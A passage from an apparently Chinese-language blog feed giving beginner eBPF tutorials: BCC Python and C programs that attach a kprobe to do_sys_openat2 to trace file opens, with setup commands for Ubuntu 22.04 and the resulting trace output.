程序并挂载到内核探针上</span><br>b = BPF(src_file=<span class="hljs-string">&quot;trace-open.c&quot;</span>)<br>b.attach_kprobe(event=<span class="hljs-string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="hljs-string">&quot;hello_world&quot;</span>)<br><br><span class="hljs-comment"># 2) print header</span><br><span class="hljs-comment"># 输出一行 Header 字符串表示数据的格式</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%-18s %-16s %-6s %-16s&quot;</span> % (<span class="hljs-string">&quot;TIME(s)&quot;</span>, <span class="hljs-string">&quot;COMM&quot;</span>, <span class="hljs-string">&quot;PID&quot;</span>, <span class="hljs-string">&quot;FILE&quot;</span>))<br><br><span class="hljs-comment"># 3) define the callback for perf event</span><br><span class="hljs-comment"># print_event 定义一个数据处理的回调函数，打印进程的名字、PID 以及它调用 openat 时打开的文件</span><br>start = 0<br>def print_event(cpu, data, size):<br>    global start<br>    event = b[<span class="hljs-string">&quot;events&quot;</span>].event(data)<br>    <span class="hljs-keyword">if</span> start == 0:<br>            start = event.ts<br>    time_s = (<span class="hljs-built_in">float</span>(event.ts - start)) / 1000000000<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%-18.9f %-16s %-6d %-16s&quot;</span> % (time_s, event.comm, event.pid, event.fname))<br><br><span class="hljs-comment"># 4) loop with callback to print_event</span><br><span class="hljs-comment"># open_perf_buffer 定义了名为 “events” 的 Perf 事件映射，而后通过一个循环调用 perf_buffer_poll 读取映射的内容，并执行回调函数输出进程信息</span><br>b[<span class="hljs-string">&quot;events&quot;</span>].open_perf_buffer(print_event)<br><span class="hljs-keyword">while</span> 1:<br>    try:<br>        b.perf_buffer_poll()<br>    except KeyboardInterrupt:<br>        <span class="hljs-built_in">exit</span>()<br><br><br><span class="hljs-comment"># 怎样从用户态读取 BPF 映射内容并输出到标准输出（stdout）呢？</span><br><span class="hljs-comment"># 在 BCC 中，与 eBPF 程序中 BPF_PERF_OUTPUT  相对应的用户态辅助函数是 open_perf_buffer() 。它需要传入一个回调函数，用于处理从 Perf 事件类型的 BPF 映射中读取到的数据。</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo python3 trace-open.py</span><br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:41:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP32__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:4:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:42:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP64__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:5:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:43:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP16__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:3:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__ 1</span><br>        ^<br>3 warnings generated.<br>TIME(s)            COMM             PID    FILE<br>0.000000000        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.249586834        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.pressure&#x27;</span><br>0.249744243        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.current&#x27;</span><br>0.249765844        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.min&#x27;</span><br>0.249783697        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.low&#x27;</span><br>0.249800399        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.swap.current&#x27;</span><br>0.249818063        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.stat&#x27;</span><br>0.249918042        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.pressure&#x27;</span><br>0.249993365        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.current&#x27;</span><br>0.250011319        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.min&#x27;</span><br>0.250028852        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.low&#x27;</span><br>0.250045734        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.swap.current&#x27;</span><br>0.250062576        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.stat&#x27;</span><br>0.250117370        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.499947185        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.537863286        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/etc/ld.so.cache&#x27;</span><br>0.537898282        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>0.538648765        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/lib/locale/locale-archive&#x27;</span><br>0.538766849        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale/locale.alias&#x27;</span><br>0.538832774        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538838585        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538844537        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538850207        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538868322        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.539986006        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/etc/ld.so.cache&#x27;</span><br>0.540310641        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>0.541208063        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/lib/locale/locale-archive&#x27;</span><br>0.541523040        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale/locale.alias&#x27;</span><br>0.541664007        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541768956        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541841113        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541911206        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541993672        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/stat&#x27;</span><br>0.542297589        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/version&#x27;</span><br>0.542427826        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/uptime&#x27;</span><br>0.542513568        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/loadavg&#x27;</span><br>0.542576598        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/sys/fs/file-nr&#x27;</span><br>0.542649275        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/sys/kernel/hostname&#x27;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ebpf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ebpf】first try2</title>
    <link href="/2023/01/29/ebpf/unsupported/%E3%80%90ebpf%E3%80%91first%20try2/"/>
    <url>/2023/01/29/ebpf/unsupported/%E3%80%90ebpf%E3%80%91first%20try2/</url>
    
    <content type="html"><![CDATA[<h2 id="虚拟机基本环境信息"><a href="#虚拟机基本环境信息" class="headerlink" title="虚拟机基本环境信息"></a>虚拟机基本环境信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># uname -a</span><br>Linux ubuntu-22 5.15.0-58-generic <span class="hljs-comment">#64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># uname -r</span><br>5.15.0-58-generic<br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># lsb_release -a</span><br>No LSB modules are available.<br>Distributor ID: Ubuntu<br>Description:    Ubuntu 22.04.1 LTS<br>Release:        22.04<br>Codename:       jammy<br><br></code></pre></td></tr></table></figure><p>搭建ubuntu虚拟机可以看到我的另一篇教程：<br><a href="https://blog.csdn.net/weixin_42072280/article/details/128351846?spm=1001.2014.3001.5501"># 【网络成长记】VMware16.2.2中创建ubuntu22.04.1虚拟机+修改静态ip+换源+mobaxterm远程连接+修改命令提示符颜色</a></p><h2 id="安装-eBPF-开发和运行所需要的开发工具"><a href="#安装-eBPF-开发和运行所需要的开发工具" class="headerlink" title="安装 eBPF 开发和运行所需要的开发工具"></a>安装 eBPF 开发和运行所需要的开发工具</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># sudo apt-get install -y make clang llvm libelf-dev libbpf-dev bpfcc-tools libbpfcc-dev linux-tools-$(uname -r) linux-headers-$(uname -r)</span><br></code></pre></td></tr></table></figure><h2 id="ebpf的CO-RE特性前提条件"><a href="#ebpf的CO-RE特性前提条件" class="headerlink" title="ebpf的CO-RE特性前提条件"></a>ebpf的CO-RE特性前提条件</h2><p>在使用 CO-RE 之前，内核需要开启 CONFIG_DEBUG_INFO_BTF&#x3D;y 和 CONFIG_DEBUG_INFO&#x3D;y 这两个编译选项。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># cat /boot/config-5.15.0-58-generic  |grep -i config_debug_info</span><br>CONFIG_DEBUG_INFO=y<br><span class="hljs-comment"># CONFIG_DEBUG_INFO_REDUCED is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_COMPRESSED is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_SPLIT is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_DWARF_TOOLCHAIN_DEFAULT is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_DWARF4 is not set</span><br>CONFIG_DEBUG_INFO_DWARF5=y<br>CONFIG_DEBUG_INFO_BTF=y<br>CONFIG_DEBUG_INFO_BTF_MODULES=y<br>[root@ubuntu-22 ~]<span class="hljs-comment">#</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># ll /sys/kernel/btf/vmlinux</span><br>-r--r--r-- 1 root root 5178563  1月 29 16:02 /sys/kernel/btf/vmlinux<br><br></code></pre></td></tr></table></figure><h2 id="第一个ebpf程序：跟踪-openat-（即打开文件）系统调用"><a href="#第一个ebpf程序：跟踪-openat-（即打开文件）系统调用" class="headerlink" title="第一个ebpf程序：跟踪 openat()（即打开文件）系统调用"></a>第一个ebpf程序：跟踪 openat()（即打开文件）系统调用</h2><h3 id="第一步：使用-C-开发一个-eBPF-程序"><a href="#第一步：使用-C-开发一个-eBPF-程序" class="headerlink" title="第一步：使用 C 开发一个 eBPF 程序"></a>第一步：使用 C 开发一个 eBPF 程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat hello.c</span><br>int hello_world(void *ctx)<br>&#123;<br>    bpf_trace_printk(<span class="hljs-string">&quot;Hello, World!&quot;</span>);  // 最常用的 BPF 辅助函数，它的作用是输出一段字符串。不过，由于 eBPF 运行在内核中，它的输出并不是通常的标准输出（stdout），而是内核调试文件 /sys/kernel/debug/tracing/trace_pipe<br>    <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br>// eBPF程序并不能随便的调用内核函数，必须通过辅助函数才可完成eBPF程序和其他内核模块的交互，eg bpf_trace_printk()<br><br></code></pre></td></tr></table></figure><h3 id="第二步：使用-Python-和-BCC-库开发一个用户态程序"><a href="#第二步：使用-Python-和-BCC-库开发一个用户态程序" class="headerlink" title="第二步：使用 Python 和 BCC 库开发一个用户态程序"></a>第二步：使用 Python 和 BCC 库开发一个用户态程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat hello.py</span><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># 1) import bcc library</span><br><span class="hljs-comment"># 导入了 BCC  库的 BPF 模块，以便接下来调用；</span><br>from bcc import BPF<br><br><span class="hljs-comment"># 2) load BPF program</span><br><span class="hljs-comment"># 调用 BPF() 加载第一步开发的 BPF 源代码；</span><br>b = BPF(src_file=<span class="hljs-string">&quot;hello.c&quot;</span>)<br><br><span class="hljs-comment"># 3) attach kprobe</span><br><span class="hljs-comment"># 将 BPF 程序挂载到内核探针（简称 kprobe），其中 do_sys_openat2() 是系统调用 openat() 在内核中的实现；</span><br><span class="hljs-comment"># 调用了 attach_kprobe 函数，绑定了一个内核跟踪事件</span><br>b.attach_kprobe(event=<span class="hljs-string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="hljs-string">&quot;hello_world&quot;</span>)<br><br><br><span class="hljs-comment"># 4) read and print /sys/kernel/debug/tracing/trace_pipe</span><br><span class="hljs-comment"># 读取内核调试文件 /sys/kernel/debug/tracing/trace_pipe 的内容，并打印到标准输出中。</span><br>b.trace_print()<br><br><br><span class="hljs-comment"># 内核函数 do_sys_openat2</span><br><br><span class="hljs-comment"># 理解：opennat()和opennat2()都是系统调用</span><br><span class="hljs-comment"># 在计算机中运行程序、读写文件，都会涉及到文件的打开操作，Linux v5.10 与文件打开相关的系统调用有 open() / creat() / openat() / openat2这四类，在使用 glibc v2.32 时，几乎所有的文件打开操作使用的都是 openat2() 这个系统调用。</span><br><br><span class="hljs-comment"># 用高级语言开发的 eBPF 程序，需要首先编译为 BPF 字节码，然后借助 bpf 系统调用加载到内核中，最后再通过性能监控等接口与具体的内核事件进行绑定。这样，内核的性能监控模块才会在内核事件发生时，自动执行我们开发的 eBPF 程序。</span><br></code></pre></td></tr></table></figure><h3 id="第三步：执行-eBPF-程序"><a href="#第三步：执行-eBPF-程序" class="headerlink" title="第三步：执行 eBPF 程序"></a>第三步：执行 eBPF 程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo python3 hello.py</span><br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:41:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP32__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:4:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:42:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP64__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:5:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:43:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP16__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:3:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__ 1</span><br>        ^<br>3 warnings generated.<br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7270.693212: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7270.693407: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.246610: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.246653: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.246911: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.247487: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.247529: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43244   [000] d...1  7271.248757: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43244   [000] d...1  7271.248848: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43245   [000] d...1  7271.249767: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43245   [000] d...1  7271.249825: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-43246   [000] d...1  7271.251964: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-43246   [000] d...1  7271.252028: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43247   [000] d...1  7271.253499: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43247   [000] d...1  7271.253554: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7271.943581: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7272.943654: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43255   [000] d...1  7273.267842: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43255   [000] d...1  7273.268730: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.272320: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.272921: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.273573: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.274131: bpf_trace_printk: Hello, World!&#x27;</span><br><br><br></code></pre></td></tr></table></figure><h2 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs 